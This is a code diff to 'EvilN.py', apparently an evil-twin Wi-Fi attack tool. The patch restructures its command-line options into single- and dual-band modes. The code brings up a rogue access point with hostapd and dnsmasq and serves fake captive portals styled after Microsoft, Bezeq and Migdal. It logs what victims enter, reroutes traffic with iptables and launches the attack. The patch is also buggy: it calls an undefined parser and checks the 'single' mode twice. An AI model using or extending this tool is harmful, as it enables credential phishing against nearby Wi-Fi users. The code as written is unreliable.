     sys.exit(0)
+
+#########################################################
+
+def parse_args():
+    p = argparse.ArgumentParser(prog="EvilN.py", description="Just be nice to your neighbors")
+    sub = p.add_subparsers(dest="mode", required=True)
+
+    single = sub.add_parser("single", help="choose one single band 2.4GHz or 5GHz")
+    src1 = single.add_mutually_exclusive_group(required=True)
+    src1.add_argument("--band", dest="band", choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
+    src1.add_argument('--ssid', dest="ssid", help="SSID Name for your Network")
+    src1.add_argument('--channel', type=int, help="Channel for the network")
+    src1.add_argument('--network', help="Network address in CIDR format ( 192.168.100.0/24)")
+    single.add_argument('--iface', dest="iface", default="wlan0", help="Wireless interface to use. Default wlan0")
+    single.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq", "migdal"], default="default", help="Choose Your Captive Portal")
+
+    dual = sub.add_parser("dual", help="works with to bands 2.4GHz and 5GHz")
+    src2 = dual.add_mutually_exclusive_group(required=True)
+    src2.add_argument('--ssid', dest="ssid", help="SSID Name for your Network")
+    src2.add_argument('--network', help="Network address in CIDR format ( 192.168.100.0/24)")
+    dual.add_argument("--iface1", dest="iface1",default="wlan1", help="Wireless interface bind to channel 2.4GHz, Deafult wlan1")
+    dual.add_argument("--iface2", dest="iface2", default="wlan0", help="Wireless interface bind to channel 5GHz, Default wlan0")
+    dual.add_argument("--channel2.4", dest="channel24", default="1", help="Choose 2.4GHz Channel, Bind to iface1")
+    dual.add_argument("--channel5", dest="channel5", default="36", help="Choose 5GHz Channel, Bind to iface2")
+    dual.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq", "migdal"], default="default", help="Choose Your Captive Portal")
+
+
 
 #############################################################################
 def main():
-    global script_args
+    script_args = parse_args()
     
-    parser = argparse.ArgumentParser(description="Just loving your neighbor")
-    parser.add_argument('--iface', dest="iface", default="wlan0", help="Wireless interface to use Default wlan0")
-    parser.add_argument('--ssid', dest="ssid", required=True, help="SSID Name for your Network")
-    parser.add_argument("--band", dest="band", choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
-    parser.add_argument('--channel', type=int, help="Channel for the network")
-    parser.add_argument('--network', required=True, help="Network address in CIDR format ( 192.168.50.0/24)")
-    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq", "migdal"], default="default", help="Choose Your Captive Portal")
-    parser.add_argument("--Dual", dest="dual", action="store_true", help="for fual band")
-    parser.add_argument("--iface1", dest="iface1", help="First interface Bind to channel 2.4")
-    parser.add_argument("--iface2", dest="iface2", help="Second interface Bind to channel 5")
-    parser.add_argument("--channel2.4", dest="channel24", default="1", help="2.4GHz Channel Bind to iface1")
-    parser.add_argument("--channel5", dest="channel5", default="36", help="5GHz Channel Bind to iface2")
-    script_args = parser.parse_args()
-
-    if script_args.network is None:
-        parser.error("Need to use --network x.x.x.x/24")
-
-    if script_args.Cap is None:
-        print("--CaptivePortal Default is 'default' ")
-
-    if script_args.dual and (script_args.iface1 is None or script_args.iface2 is None or script_args.channel24 is None or script_args.channel5 is None):
-        parser.error("--dual require --iface1 --iface2 --channel1 --channel2")
-
-    if script_args.band and (script_args.ssid is None or script_args.channel is None or script_args.network is None):
-        parser.error("--band require --ssid and --channel and --network")
-    
-
-
     CH_24 = set(range(1, 14))
     CH_5_NON_DFS = {36, 40, 44, 48, 149, 153, 157, 161, 165}
 
-    if script_args.band == "2.4" and script_args.channel not in CH_24:
-        parser.error(f"--channel {script_args.channel} Use channels from 1-14")
-    if script_args.band == "5" and script_args.channel not in CH_5_NON_DFS:
-        parser.error(f"--channel {script_args.channel} Use channels from 36, 40, 44, 48, 149, 153, 157, 161, 165")
+    if script_args.mode == "single":
+        if script_args.network is None:
+            parser.error("Need to use --network x.x.x.x/24")
 
-    if script_args.dual:
+        if script_args.band and (script_args.ssid is None or script_args.channel is None or script_args.network is None):
+            parser.error("--band require --ssid and --channel and --network")
+
+        if script_args.band == "2.4" and script_args.channel not in CH_24:
+            parser.error(f"--channel {script_args.channel} Use channels from 1-14")
+        if script_args.band == "5" and script_args.channel not in CH_5_NON_DFS:
+            parser.error(f"--channel {script_args.channel} Use channels from 36, 40, 44, 48, 149, 153, 157, 161, 165")
+
+        
+        check_root()
+        check_dependencies()
+
+        signal.signal(signal.SIGINT, cleanup)
+
+        manage_service('NetworkManager', 'stop')
+        manage_service('systemd-resolved', 'stop')
+
+        ip_addr = configure_interface(script_args.iface, script_args.network)
+        create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
+
+        if script_args.band == '2.4':
+            create_hostapd_conf2_4(script_args.iface, script_args.ssid, script_args.channel)
+        elif script_args.band == '5':
+            create_hostapd_conf5(script_args.iface, script_args.ssid, script_args.channel)
+
+        setup_apache()
+
+        if script_args.Cap == 'default':
+            setup_captive_portal_files("default")
+        elif script_args.Cap == 'microsoft':
+            setup_captive_portal_files("microsoft")
+        elif script_args.Cap == 'bezeq':
+            setup_captive_portal_files("bezeq")  
+        elif script_args.Cap == 'migdal':
+            setup_captive_portal_files("migdal") 
+
+        setup_log_file()
+
+        if script_args.Cap == 'default':
+            create_vhost()
+        elif script_args.Cap == 'microsoft':
+            create_vhost_microsoft()
+        elif script_args.Cap == 'bezeq':
+            create_vhost_bezeq()
+        elif script_args.Cap == 'migdal':
+            create_vhost_migdal()
+
+        enable_apache_site()
+
+        if not toggle_ip_forwarding(enable=True):
+            cleanup(0, 0)
+            sys.exit(1)
+
+        setup_iptables(script_args.iface)
+
+        start_attack()
+
+        while True:
+            time.sleep(1)
+
+####################################################################
+
+    elif script_args.mode == "single":
+
         check_root()
         check_dependencies()
 
@@ -1175,62 +1215,6 @@ def main():
 
         while True:
             time.sleep(1)
-
-    ################################################################
-    else:
-        check_root()
-        check_dependencies()
-
-        signal.signal(signal.SIGINT, cleanup)
-
-        manage_service('NetworkManager', 'stop')
-        manage_service('systemd-resolved', 'stop')
-
-        ip_addr = configure_interface(script_args.iface, script_args.network)
-        create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
-
-        if script_args.band == '2.4':
-            create_hostapd_conf2_4(script_args.iface, script_args.ssid, script_args.channel)
-        elif script_args.band == '5':
-            create_hostapd_conf5(script_args.iface, script_args.ssid, script_args.channel)
-
-        setup_apache()
-
-        if script_args.Cap == 'default':
-            setup_captive_portal_files("default")
-        elif script_args.Cap == 'microsoft':
-            setup_captive_portal_files("microsoft")
-        elif script_args.Cap == 'bezeq':
-            setup_captive_portal_files("bezeq")  
-       elif script_args.Cap == 'bezeq':
-            setup_captive_portal_files("migdal") 
-
-        setup_log_file()
-
-        if script_args.Cap == 'default':
-            create_vhost()
-        elif script_args.Cap == 'microsoft':
-            create_vhost_microsoft()
-        elif script_args.Cap == 'bezeq':
-            create_vhost_bezeq()
-        elif script_args.Cap == 'migdal':
-            create_vhost_migdal()
-
-        enable_apache_site()
-
-        if not toggle_ip_forwarding(enable=True):
-            cleanup(0, 0)
-            sys.exit(1)
-
-        setup_iptables(script_args.iface)
-
-        start_attack()
-
-        while True:
-            time.sleep(1)
-
-
-    ################3################################
 
 if __name__ == "__main__":
     main()
